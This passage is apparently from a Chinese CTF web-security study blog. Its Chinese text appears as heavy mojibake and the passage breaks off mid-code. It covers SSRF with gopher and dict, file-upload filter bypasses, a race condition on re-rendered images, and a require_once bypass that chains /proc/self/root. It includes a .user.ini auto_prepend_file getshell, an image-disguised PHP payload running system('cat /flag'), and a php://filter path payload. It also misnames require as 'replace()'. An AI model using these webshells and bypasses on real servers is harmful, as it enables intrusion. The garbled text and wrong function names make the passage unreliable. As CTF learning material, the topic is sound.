<p>ä½†æ˜¯æˆ‘ä»¬åœ¨ç”¨<code>gopher</code>è¿˜æ˜¯éœ€è¦ç”¨<code>dict</code>åè®®å»å¾—åˆ°<code>mysql</code>çš„ç«¯å£(é»˜è®¤æ˜¯**<code>3306</code>**)</p>
<p>ç›´æ¥ä½¿ç”¨çš„<code>gopherus</code>å·¥å…·,ç›´æ¥å¿«é€Ÿç”Ÿæˆ<code>payload</code></p>
<p><img src="/post/Web-study/image-20220815234910350.png" alt="image-20220815234910350"></p>
<h2 id="å…­ã€æ–‡ä»¶ä¸Šä¼ "><a href="#å…­ã€æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="å…­ã€æ–‡ä»¶ä¸Šä¼ "></a>å…­ã€æ–‡ä»¶ä¸Šä¼ </h2><h3 id="1-å¤šé‡è¿‡æ»¤ç»•è¿‡"><a href="#1-å¤šé‡è¿‡æ»¤ç»•è¿‡" class="headerlink" title="1.å¤šé‡è¿‡æ»¤ç»•è¿‡"></a>1.å¤šé‡è¿‡æ»¤ç»•è¿‡</h3><p><u><strong>ä¸‹é¢æ˜¯ä»¥æ”»é˜²ä¸–ç•Œçš„ä¸€é“easyuploadçš„wpè®²è§£ä¸€äº›æƒ…å½¢çš„ç»•è¿‡æ–¹å¼</strong></u></p>
<p>è¿™é‡Œéœ€è¦ç»•è¿‡çš„ç‚¹å¦‚ä¸‹</p>
<blockquote>
<ul>
<li>æ£€æŸ¥æ–‡ä»¶å†…å®¹æ˜¯å¦æœ‰<code>php</code>å­—ç¬¦ä¸²</li>
<li>æ£€æŸ¥åç¼€ä¸­æ˜¯å¦æœ‰<code>htaccess</code>æˆ–<code>php</code></li>
<li>æ£€æŸ¥æ–‡ä»¶å¤´éƒ¨ä¿¡æ¯</li>
<li>æ–‡ä»¶<code>MIME</code>ç±»å‹</li>
</ul>
</blockquote>
<h4 id="çŸ­æ ‡ç­¾"><a href="#çŸ­æ ‡ç­¾" class="headerlink" title="çŸ­æ ‡ç­¾"></a>çŸ­æ ‡ç­¾</h4><p>å¯¹äº<u>ç¬¬ä¸€ç‚¹</u>å¯ä»¥åˆ©ç”¨<strong>çŸ­æ ‡ç­¾</strong>ç»•è¿‡ï¼Œä¾‹å¦‚ <code>&lt;?=phpinfo();?&gt;</code></p>
<blockquote>
<p>æŠŠ<code>short_open_tag</code>å­—æ®µæ”¹ä¸º<code>On</code>ï¼Œå°±å¯ä»¥å®ç°çŸ­æ ‡ç­¾åŠŸèƒ½</p>
<p>çŸ­æ ‡ç­¾ï¼š<br>1.èƒ½æ­£å¸¸è§£æç±»ä¼¼äºè¿™æ ·å½¢å¼çš„phpæ–‡ä»¶ï¼š <code>phpinfo() ?&gt;</code>  </p>
<p>2.ä½¿ç”¨<code>&lt;?=$a?&gt;</code>çš„å½¢å¼è¾“å‡ºï¼Œåœ¨çŸ­æ ‡ç­¾çœ‹æ¥ï¼Œ<code>&lt;?=$a?&gt;</code></p>
<p>3.<code>&lt;?=(è¡¨è¾¾å¼)?&gt;</code><br>å°±ç›¸å½“äº</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (è¡¨è¾¾å¼)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>æ­£ç¡®ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27; phpinfo();?&gt;&lt;? echo $a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æŠ¥é”™ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;&lt;? phpinfo();?&gt;&lt;?=$a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä»è¿™ä¸ªå¯¹æ¯”è¯•éªŒæˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼š<br>åœ¨çŸ­æ ‡ç­¾æ¨¡å¼ä¸‹ï¼Œ<br>æˆ‘ä»¬æ‰§è¡Œphpè¯­å¥phpå‡½æ•°ï¼Œéƒ½ç”¨ç±»ä¼¼äºè¿™æ ·å½¢å¼çš„phpæ–‡ä»¶ï¼š</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="built_in">phpinfo</span>();?&gt;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æˆ‘ä»¬è¦è¾“å‡ºä¸€ä¸ªflagï¼Œæˆ–è€…å˜é‡æ—¶ï¼Œä½¿ç”¨<code>&lt;?=$a?&gt;</code>çš„å½¢å¼è¾“å‡º</p>
</blockquote>
<h4 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h4><p>å¯¹äº<u>ç¬¬äºŒç‚¹</u>å¯ä»¥é€šè¿‡ä¸Šä¼ <code>.user.ini</code>ä»¥åŠæ­£å¸¸<code>jpg</code>æ–‡ä»¶æ¥è¿›è¡Œ<code>getshell</code>,å¯ä»¥å‚è€ƒä»¥ä¸‹æ–‡ç« </p>
<blockquote>
<p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">æ–‡ç« </a></p>
</blockquote>
<p><strong>åœ¨æœåŠ¡å™¨ä¸­ï¼Œåªè¦æ˜¯è¿ç”¨äº†fastcgiçš„æœåŠ¡å™¨å°±èƒ½å¤Ÿåˆ©ç”¨è¯¥æ–¹å¼getshellï¼Œä¸è®ºæ˜¯apacheæˆ–è€…ngnixæˆ–æ˜¯å…¶ä»–æœåŠ¡å™¨ã€‚</strong></p>
<p> <strong>è¿™ä¸ªæ–‡ä»¶æ˜¯php.iniçš„è¡¥å……æ–‡ä»¶ï¼Œå½“ç½‘é¡µè®¿é—®çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ˜¯å¦æœ‰.user.iniï¼Œç„¶åå°†å…¶è¡¥å……è¿›php.iniï¼Œå¹¶ä½œä¸ºcgiçš„å¯åŠ¨é¡¹ã€‚</strong></p>
<p> <strong>å…¶ä¸­å¾ˆå¤šåŠŸèƒ½è®¾ç½®äº†åªèƒ½php.inié…ç½®ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ä¸€äº›å±é™©çš„åŠŸèƒ½å¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶ï¼Œæ¯”å¦‚auto_prepend_fileã€‚</strong></p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">.<span class="keyword">user</span>.iniå†…å®¹</span><br><span class="line"></span><br><span class="line">auto_prepend_file=<span class="number">5</span>.jpg</span><br><span class="line"></span><br><span class="line">è¿™æ ·.<span class="keyword">user</span>.iniå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ä¼šè‡ªåŠ¨åŒ…å«å›¾ç‰‡ğŸï¼Œä»è€Œè®©æˆ‘ä»¬æˆåŠŸæ‹¿åˆ°<span class="keyword">shell</span></span><br></pre></td></tr></table></figure>

<p><u>ç¬¬ä¸‰ç‚¹</u>ç»•è¿‡æ–¹å¼å³åœ¨æ–‡ä»¶å¤´éƒ¨æ·»åŠ ä¸€ä¸ªå›¾ç‰‡çš„<strong>æ–‡ä»¶å¤´</strong>ï¼Œæ¯”å¦‚<code>GIF89a</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">JPG</span> ï¼šFF D8 FF E0 <span class="number">00</span> <span class="number">10</span> <span class="number">4</span>A <span class="number">46</span> <span class="number">49</span> <span class="number">46</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">GIF</span>(ç›¸å½“äºæ–‡æœ¬çš„GIF89a)ï¼š<span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span> <span class="number">39</span> <span class="number">61</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">PNG</span>ï¼š <span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span></span><br></pre></td></tr></table></figure>

<p><u>ç¬¬å››ç‚¹</u>ç»•è¿‡æ–¹æ³•å³ä¿®æ”¹ä¸Šä¼ æ—¶çš„<code>Content-Type</code></p>
<p>å› æ­¤æœ€ç»ˆçš„<code>payload</code>ä¸ºï¼š<br> ä¸Šä¼ <code>.user.ini</code>ï¼Œå†…å®¹ä¸º</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">GIF89a                  </span><br><span class="line"><span class="attribute">auto_prepend_file</span>=a.jpg</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">auto</span>_append_fileã€<span class="built_in">auto</span>_prepend_file:æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°ã€‚è€Œ<span class="built_in">auto</span>_append_fileç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚ </span><br><span class="line"></span><br><span class="line">ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­ï¼š</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ a.jpgï¼Œå†…å®¹ä¸º</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?</span>=<span class="keyword">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-æ–‡ä»¶ç±»å‹"><a href="#2-æ–‡ä»¶ç±»å‹" class="headerlink" title="2.æ–‡ä»¶ç±»å‹"></a>2.æ–‡ä»¶ç±»å‹</h3><p><img src="/post/Web-study/20200226180218842.png" alt="20200226180218842"></p>
<h3 id="3-å…¶ä»–ç»•è¿‡"><a href="#3-å…¶ä»–ç»•è¿‡" class="headerlink" title="3.å…¶ä»–ç»•è¿‡"></a>3.å…¶ä»–ç»•è¿‡</h3><h4 id="1ï¼‰-DATAç»•è¿‡"><a href="#1ï¼‰-DATAç»•è¿‡" class="headerlink" title="1ï¼‰::$DATAç»•è¿‡"></a>1ï¼‰::$DATAç»•è¿‡</h4><blockquote>
<p>â— ç»•è¿‡â½…æ³•ï¼š</p>
<p>â—‹ é€šè¿‡æŠ“å–ä¸Šä¼ æ•°æ®åŒ…ï¼Œä¿®æ”¹ä¸Šä¼ çš„â½‚ä»¶åç¼€ï¼Œå®ç°ä¸Šä¼ ã€‚</p>
<p>ç»•è¿‡åŸç†ï¼š</p>
<p>â— ä¸ä¸Šâ¾¯é¢˜ç›¸â½å‘¢è¿™ä¸ªé“é¢˜å»æ‰äº†ï¼š$file_ext &#x3D; str_ireplace(â€˜::$DATAâ€™, â€˜â€™, $file_ext);&#x2F;&#x2F;å»é™¤å­—ç¬¦</p>
<p>ä¸²::$DATA è¿™â¾ä»£ç ã€‚</p>
<p>â— ::$DATA æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿå¿…é¡»æ˜¯windows, å¿…é¡»æ˜¯php, å¿…é¡»æ˜¯é‚£ä¸ªæºâ½‚ä»¶ï¼Œphpåœ¨windowçš„æ—¶å€™å¦‚</p>
<p>æœâ½‚ä»¶å+â€::$DATAâ€ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆâ½‚ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€å.ä¸”æŒâ€::$DATAâ€ä¹‹å‰</p>
<p>çš„â½‚ä»¶å</p>
<p>â— ä»–çš„â½¬çš„å°±æ˜¯ä¸æ£€æŸ¥åç¼€å</p>
</blockquote>
<h4 id="2ï¼‰ç‚¹-ç©ºæ ¼-ç‚¹ç»•è¿‡"><a href="#2ï¼‰ç‚¹-ç©ºæ ¼-ç‚¹ç»•è¿‡" class="headerlink" title="2ï¼‰ç‚¹+ç©ºæ ¼+ç‚¹ç»•è¿‡"></a>2ï¼‰ç‚¹+ç©ºæ ¼+ç‚¹ç»•è¿‡</h4><blockquote>
<p>ä¾‹å¦‚ï¼Œåªå…è®¸ä¸Šä¼ .jpg|.png|.gifåç¼€çš„â½‚ä»¶ï¼</p>
<p>â— ç»•è¿‡â½…æ³•ï¼š</p>
<p>â—‹ é€šè¿‡æŠ“å–ä¸Šä¼ æ•°æ®åŒ…ï¼Œä¿®æ”¹ä¸Šä¼ çš„â½‚ä»¶åç¼€ï¼Œå®ç°ä¸Šä¼ ã€‚</p>
<p>ç»•è¿‡åŸç†ï¼š</p>
<p>â— åœ¨windowsç³»ç»Ÿä¸‹ï¼Œå¦‚æœâ½‚ä»¶åä»¥â€œ.â€æˆ–è€…ç©ºæ ¼ä½œä¸ºç»“å°¾ï¼Œç³»ç»Ÿä¼šâ¾ƒåŠ¨åˆ é™¤â€œ.â€ä¸ç©ºæ ¼ï¼Œåˆ©â½¤æ­¤ç‰¹æ€§</p>
<p>ä¹Ÿå¯ä»¥ç»•è¿‡â¿Šåå•éªŒè¯ã€‚apacheä¸­å¯ä»¥åˆ©â½¤ç‚¹ç»“å°¾å’Œç©ºæ ¼ç»•è¿‡ï¼Œaspå’Œaspxä¸­å¯ä»¥â½¤ç©ºæ ¼ç»•è¿‡ã€‚</p>
<p>â— ç»è¿‡è„šæœ¬â¼€ç³»åˆ—çš„å¤„ç†ä¹‹ååŸæœ¬.php. .çš„åç¼€åå˜æˆäº†.php. ï¼Œ</p>
<p>â½½ç”±äºWindowsçš„ç‰¹æ€§ï¼Œâ¼œå°†â½‚ä»¶æœ«å°¾çš„ç‚¹ç»™å»é™¤äº†ï¼Œ</p>
<p>æœ€ç»ˆå°±å­˜çš„æ—¶å€™.phpçš„â½‚ä»¶ã€‚åŒç†ä¹Ÿå¯ä»¥ä¸Šä¼ .htaccess. .ç­‰â½‚ä»¶ã€‚ã€‚ã€‚</p>
<p>(å°±ç®—æ²¡æœ‰ç»è¿‡è„šæœ¬çš„å¤„ç†,.php. .åœ¨windowsä¸­ä¹Ÿæ˜¯ä¼šè¢«å­˜å‚¨ä¸º.php)</p>
</blockquote>
<h4 id="3ï¼‰00æˆªæ–­"><a href="#3ï¼‰00æˆªæ–­" class="headerlink" title="3ï¼‰00æˆªæ–­"></a>3ï¼‰00æˆªæ–­</h4><blockquote>
<p>ç»•è¿‡åŸç†ï¼š</p>
<p>â— è¿™æ—¶å€™å°±è¦åˆ©â½¤0x00æˆªæ–­åŸç†äº†ï¼Œå…·ä½“åŸç†æ˜¯ ç³»ç»Ÿåœ¨å¯¹â½‚ä»¶åçš„è¯»å–æ—¶ï¼Œå¦‚æœé‡åˆ°0x00ï¼Œå°±ä¼šè®¤</p>
<p>ä¸ºè¯»å–å·²ç»“æŸã€‚</p>
<p>â— ä½†è¦æ³¨æ„æ˜¯â½‚ä»¶çš„16è¿›åˆ¶å†…å®¹â¾¥çš„00ï¼Œâ½½ä¸æ˜¯â½‚ä»¶åä¸­çš„00 ï¼ï¼ï¼å°±æ˜¯è¯´ç³»ç»Ÿæ˜¯æŒ‰16è¿›åˆ¶è¯»å–â½‚</p>
<p>ä»¶ï¼ˆæˆ–è€…è¯´â¼†è¿›åˆ¶ï¼‰ï¼Œ</p>
<p>â— é‡åˆ°asciiç ä¸ºé›¶çš„ä½ç½®å°±åœâ½Œï¼Œâ½½è¿™ä¸ªasciiç ä¸ºé›¶çš„ä½ç½®åœ¨16è¿›åˆ¶ä¸­æ˜¯00ï¼Œâ½¤0xå¼€å¤´è¡¨ç¤º16è¿›</p>
<p>åˆ¶ï¼Œä¹Ÿå°±æ˜¯æ‰€è¯´çš„0x00æˆªæ–­</p>
<p>â— å½“ç³»ç»Ÿè¯»å–åˆ°0x00æ—¶ï¼Œè®¤ä¸ºå·²ç»ç»“æŸï¼Œä¸ä¼šå†è¯»å–åâ¾¯å°†è¦æ‹¼æ¥çš„13.jpg,è®¤ä¸ºæ˜¯phpâ½‚ä»¶ï¼Œ</p>
<p>å®Œæˆç»•è¿‡ã€‚</p>
<p>%<strong>00</strong>æˆªæ–­ ä¸ <strong>0</strong>x<strong>00</strong>æˆªæ–­çš„åŒºåˆ«ï¼Ÿ</p>
<p>â— åœ°å€ä¸Šâ¾¯â½‚ä»¶å‘½åçš„åŒºåˆ«ã€‚</p>
<p>â— %00ä¸Šæ˜¯å»ºâ½´åœ¨åœ°å€ä¿¡æ¯ä¸Šçš„</p>
<p>â— 0x00 â½‚ä»¶</p>
<p>â— æ“ä½œâ½…æ³•åŸºæœ¬â¼€è‡´ã€‚</p>
<p>%<strong>00</strong>æˆªæ–­ ä¸ <strong>0</strong>x<strong>00</strong>æˆªæ–­çš„å®æˆ˜ä¸­çš„åŒºåˆ«ï¼Ÿ</p>
<p>â— å¹³æ—¶â¼€å®šè¦å¤šè§‚å¯Ÿâ¼€ä¸‹æ•°æ®åŒ…ï¼Œæ•°æ®åŒ…ä¸­åŒ…å«äº†å¾ˆå¤šå‚æ•°ï¼Œå¾ˆå¤šå‚æ•°å¯ä»¥è¿›â¾ä¿®æ”¹ã€‚</p>
</blockquote>
<h4 id="4ï¼‰äºŒæ¬¡æ¸²æŸ“-æ¡ä»¶ç«äº‰"><a href="#4ï¼‰äºŒæ¬¡æ¸²æŸ“-æ¡ä»¶ç«äº‰" class="headerlink" title="4ï¼‰äºŒæ¬¡æ¸²æŸ“+æ¡ä»¶ç«äº‰"></a>4ï¼‰äºŒæ¬¡æ¸²æŸ“+æ¡ä»¶ç«äº‰</h4><blockquote>
<p>â¼†æ¬¡æ¸²æŸ“ï¼šå°±æ˜¯æ ¹æ®â½¤æˆ·ä¸Šä¼ çš„å›¾â½šï¼Œæ–°â½£æˆâ¼€ä¸ªå›¾â½šï¼Œå°†åŸå§‹å›¾â½šåˆ é™¤ï¼Œå°†æ–°å›¾â½šæ·»åŠ åˆ°æ•°æ®åº“ä¸­ã€‚<br>â½å¦‚â¼€äº›â½¹ç«™æ ¹æ®â½¤æˆ·ä¸Šä¼ çš„å¤´åƒâ½£æˆâ¼¤ä¸­â¼©ä¸åŒå°ºâ¼¨çš„å›¾åƒ</p>
</blockquote>
<blockquote>
<p>æ¡ä»¶ç«äº‰å°±æ˜¯åœ¨ï¼Œå½“äºŒæ¬¡æ¸²æŸ“å…ˆæŠŠæ–‡ä»¶ç§»åŠ¨åˆ°å‚¨å­˜ç›®å½•åï¼Œæ‰åˆ¤æ–­æ–‡ä»¶æ˜¯å¦åˆæ³•æ—¶<br>å°±äº§â½£äº†æ¼æ´ï¼Œä¼šæœ‰â¼€ä¸ªçŸ­æš‚çš„æ—¶é—´å°†æˆ‘ä»¬ä¸Šä¼ çš„webshellå­˜å‚¨åœ¨â½¬å½•ä¸‹ï¼Œä¸”ä»¥æˆ‘ä»¬ä¸Šä¼ çš„<br>â½‚ä»¶åçš„å½¢å¼</p>
<p>ä½†æ˜¯è¿™ä¸ªæ—¶é—´ç›¸å½“ç›¸å½“çŸ­æš‚ï¼Œä»¥â¾„äºï¼Œä½ æ‰“å¼€ä¸Šä¼ â½¬å½•ï¼Œç‚¹å‡»ä¸Šä¼ â½‚ä»¶ï¼Œä½ è¿å½±â¼¦éƒ½çœ‹ä¸åˆ°å°±å·²ç»<br>æ²¡äº†ï¼Œ</p>
<p>æ‰€ä»¥è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿â½¤burpsuiteï¼Œæˆ‘ä»¬å…ˆæŠ“åŒ…ï¼Œç„¶åå‘é€åˆ°intruderæ¨¡å—ã€‚<br>ç‚¹å‡»clearå»é™¤æ‰€æœ‰å‚æ•°ï¼Œç„¶åpayloadé€‰æ‹©â½†ï¼Œå¹¶ä¸”é€‰æ‹©æŒç»­å‘åŒ…ã€‚</p>
</blockquote>
<blockquote>
<p>â¼†æ¬¡æ¸²æŸ“åªèƒ½é è¿™ä¸ªæ¡ä»¶ç«äº‰å»ç»•è¿‡ä¹ˆï¼Ÿ<br>â—‹ â¼†æ¬¡æ¸²æŸ“ï¼šè¯´çš„æ˜¯è¿™ä¸ªæŠ€æœ¯å«åšâ¼†æ¬¡æ¸²æŸ“ï¼Œä¸æ˜¯è¯´â¼†æ¬¡æ¸²æŸ“æœ‰æ¼æ´ã€‚<br>â—‹ æœ‰æ¼æ´å¯åˆ©â½¤çš„åŸå› æ˜¯å› ä¸ºï¼Œä»–æ˜¯åœ¨â½‚ä»¶ä¸Šä¼ ä¹‹åæ‰æœ‰çš„åç»­æ“ä½œï¼Œç¬¬â¼€æ­¥çš„æ—¶å€™å·²ç»å°†â½‚ä»¶<br>ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šäº†ã€‚<br>â—‹ å¦‚æœè¿™ä¸ªâ¼†æ¬¡æ¸²æŸ“åœ¨ç¬¬â¼€æ­¥ä¹‹å‰ï¼Œè¿™ä¸ªâ¼†æ¬¡æ¸²æŸ“æ˜¯æ²¡æœ‰ä»»ä½•é—®é¢˜çš„ã€‚<br>â—‹ â¼†æ¬¡æ¸²æŸ“ä¸æ˜¯æ¼æ´ï¼Œæ˜¯â¼€ç§æŠ€æœ¯ï¼Œæ˜¯â¼€ç§é€»è¾‘ä¸Šçš„éªŒè¯ï¼Œæ¡ä»¶ç«äº‰ã€‚<br>â—‹ åˆ©â½¤æ¡ä»¶ç«äº‰ï¼Œé˜²â½Œä»–ç¬¬â¼†æ­¥æ“ä½œ</p>
</blockquote>
<hr>
<h2 id="ä¸ƒã€æ–‡ä»¶åŒ…å«"><a href="#ä¸ƒã€æ–‡ä»¶åŒ…å«" class="headerlink" title="ä¸ƒã€æ–‡ä»¶åŒ…å«"></a>ä¸ƒã€æ–‡ä»¶åŒ…å«</h2><h3 id="1-æ–‡ä»¶åŒ…å«çš„å››ä¸ªå‡½æ•°ï¼š"><a href="#1-æ–‡ä»¶åŒ…å«çš„å››ä¸ªå‡½æ•°ï¼š" class="headerlink" title="1.æ–‡ä»¶åŒ…å«çš„å››ä¸ªå‡½æ•°ï¼š"></a>1.æ–‡ä»¶åŒ…å«çš„å››ä¸ªå‡½æ•°ï¼š</h3><p>1.include():å°†åœ¨å…¶è¢«è°ƒç”¨çš„ä½ç½®å¤„åŒ…å«ä¸€ä¸ªæ–‡ä»¶ã€‚åŒ…å«ä¸€ä¸ªæ–‡ä»¶ä¸åœ¨è¯¥è¯­å¥æ‰€åœ¨ä½ç½®å¤åˆ¶åˆ¶å®šæ–‡ä»¶çš„æ•°æ®å…·æœ‰ç›¸åŒå†…å®¹çš„æ•ˆæœã€‚ä½¿ç”¨include()æ—¶å¯ä»¥å¿½ç•¥æ‹¬å·ã€‚</p>
<p>2.include_once():åœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´åŒ…å«å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶ã€‚æ­¤è¡Œä¸ºå’Œ include() è¯­å¥ç±»ä¼¼ï¼Œ<u><strong>å”¯ä¸€åŒºåˆ«æ˜¯include_once()ä¼šå…ˆåˆ¤æ–­ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶åœ¨ä¹‹å‰æ˜¯å¦å·²ç»è¢«åŒ…å«è¿‡ï¼Œå¦‚å·²ç»åŒ…å«ï¼Œåˆ™å¿½ç•¥æœ¬æ¬¡åŒ…å«ã€‚</strong></u></p>
<p>3.replace() :å¾ˆå¤§ç¨‹åº¦ä¸Šä¸includeç›¸åŒï¼Œéƒ½æ˜¯å°†ä¸€ä¸ªæ¨¡æ¿æ–‡ä»¶åŒ…å«åˆ°requireè°ƒç”¨ååœ¨çš„ä½ç½®ã€‚</p>
<p>requireå’Œincludeä¹‹é—´æœ‰ä¸¤ç‚¹é‡è¦çš„åŒºåˆ«:</p>
<p>1.æ— è®ºrequireçš„ä½ç½®å¦‚ä½•ï¼Œåˆ¶å®šæ–‡ä»¶éƒ½å°†åŒ…å«åˆ°å‡ºç°requireçš„è„šæœ¬ä¸­ã€‚ä¾‹å¦‚ï¼Œå³ä½¿requireæ”¾åœ¨è®¡ç®—ç»“æœä¸ºå‡çš„ifè¯­å¥ä¸­ï¼Œä¾ç„¶ä¼šåŒ…å«æŒ‡å®šæ–‡ä»¶ã€‚<br>2.requireå‡ºé”™æ—¶ï¼Œè„šæœ¬å°†åœæ­¢è¿è¡Œï¼Œè€Œåœ¨ä½¿ç”¨includeçš„æƒ…å†µä¸‹ï¼Œè„šæœ¬å°†ç»§ç»­æ‰§è¡Œã€‚</p>
<p>4.replace_once():åœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´åŒ…å«å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶ã€‚æ­¤è¡Œä¸ºå’Œ require() è¯­å¥ç±»ä¼¼ï¼Œ<u><strong>å”¯ä¸€åŒºåˆ«æ˜¯require_once()ä¼šå…ˆåˆ¤æ–­ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶åœ¨ä¹‹å‰æ˜¯å¦å·²ç»è¢«åŒ…å«è¿‡ï¼Œå¦‚å·²ç»åŒ…å«ï¼Œåˆ™å¿½ç•¥æœ¬æ¬¡åŒ…å«</strong></u></p>
<h4 id="require-once-å¤šæ¬¡åŒ…å«"><a href="#require-once-å¤šæ¬¡åŒ…å«" class="headerlink" title="*require_once()å¤šæ¬¡åŒ…å«"></a><code>*require_once()</code>å¤šæ¬¡åŒ…å«</h4><p><u><strong>ä¸‹é¢æ˜¯ä¸€ç¯‡å…³äº<code>require_onceè¢«ä½¿ç”¨åä¸èƒ½å†ä½¿ç”¨æ€ä¹ˆç»•å¼€</code>çš„æ–‡ç« ï¼Œæœ¬äººåœ¨2022å¹´5æœˆDest0g3äºŒæ¬¡æ‹›æ–°æ¯”èµ›é‡åˆ°ç±»ä¼¼ï¼Œç‰¹æ­¤è®°å½•</strong></u></p>
<blockquote>
<p><a href="https://www.anquanke.com/post/id/213235">phpæºç åˆ†æ require_once ç»•è¿‡ä¸èƒ½é‡å¤åŒ…å«æ–‡ä»¶çš„é™åˆ¶</a></p>
</blockquote>
<blockquote>
<p><code>require_once()</code><br>åœ¨å¯¹è½¯é“¾æ¥çš„æ“ä½œä¸Šå­˜åœ¨ä¸€äº›ç¼ºé™·ï¼Œè½¯è¿æ¥å±‚æ•°è¾ƒå¤šä¼šä½¿hashåŒ¹é…ç›´æ¥å¤±æ•ˆé€ æˆé‡å¤åŒ…å«ï¼Œè¶…è¿‡20æ¬¡è½¯é“¾æ¥åå¯ä»¥ç»•è¿‡ï¼Œå¤–åŠ ä¼ªåè®®ç¼–ç ä¸€ä¸‹ï¼š</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>var<span class="regexp">/www/</span>html/flag.php</span><br></pre></td></tr></table></figure>
</blockquote>
<p>ä¸‹é¢è¯¥é¢˜ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="comment">//find something in flag1.php </span></span><br><span class="line"><span class="variable">$d</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]; </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$d</span>, FILTER_VALIDATE_URL)) &#123;   </span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$d</span>);   </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>)) &#123;     </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&quot;lai&quot;</span>) !== <span class="literal">false</span> &amp;&amp;</span><br><span class="line">  <span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&quot;ya&quot;</span>) !== 